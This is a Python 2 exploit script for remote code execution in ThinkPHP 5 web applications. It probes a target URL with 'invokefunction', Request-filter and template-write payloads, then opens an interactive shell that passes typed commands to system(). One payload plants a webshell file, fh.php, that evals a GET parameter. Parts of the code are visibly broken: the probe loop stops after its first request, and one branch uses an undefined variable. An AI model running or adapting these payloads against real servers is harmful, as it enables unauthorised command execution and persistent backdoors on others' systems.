# /usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import requests

reload(sys)
sys.setdefaultencoding('utf-8')

def test(url):
    payload = ['',r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    r"/?s=index/\think\Request/input&filter=phpinfo&data=1",
    r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    r"/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E",
    r"/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E"]

    for i in range(1,6):    
        url += payload[i]
        #print url
        try:
            r = requests.get(url,verify=False)
            if 'PHP Version' in r.text:
                return i
            else:
                return False
        except:
            print '[!] Destination address cannot be connected'
            return False

def exp(u,i):
    payload = ['',r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=",
    r"/?s=index/\think\Request/input&filter=system&data=",
    r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=",
    r"/?s=index/\think\template\driver\file/write&cacheFile=fh.php&content=%3C?php @eval($_GET['fuhei']);?%3E",
    r"/?s=index/\think\view\driver\Php/display&content=%3C?php @eval($_GET['fuhei']);?%3E"]
    while(1):
        url = u
        command = raw_input("fuhei@tp5_shell$ ")
        if command != "exit" and i < 4:
            payload1 = payload[i]+str(command)
            url += payload1
            r = requests.get(url)
            print r.text
        elif command != "exit" and i == 4:
            uu = u+payload[4]
            requests.get(uu)
            payload2 = "/fh.php?fuhei=system('"+str(command)+"');"
            url += payload2
            #print url
            r = requests.get(url)
            print r.text
        elif command != "exit" and i == 5:
            payload3 += payload[5]+"&fuhei=system('"+str(command)+"');"
            url += payload3
            r = requests.get(url)
            print r.text
        else:
            break

if __name__ == '__main__':
    url = sys.argv[1]
    i = test(url)
    if i:
        print "[+] Remote code execution vulnerability exists at the target address"
        exp(url,i)
    else:
        print "[-] There is no remote code execution vulnerability in the target address"
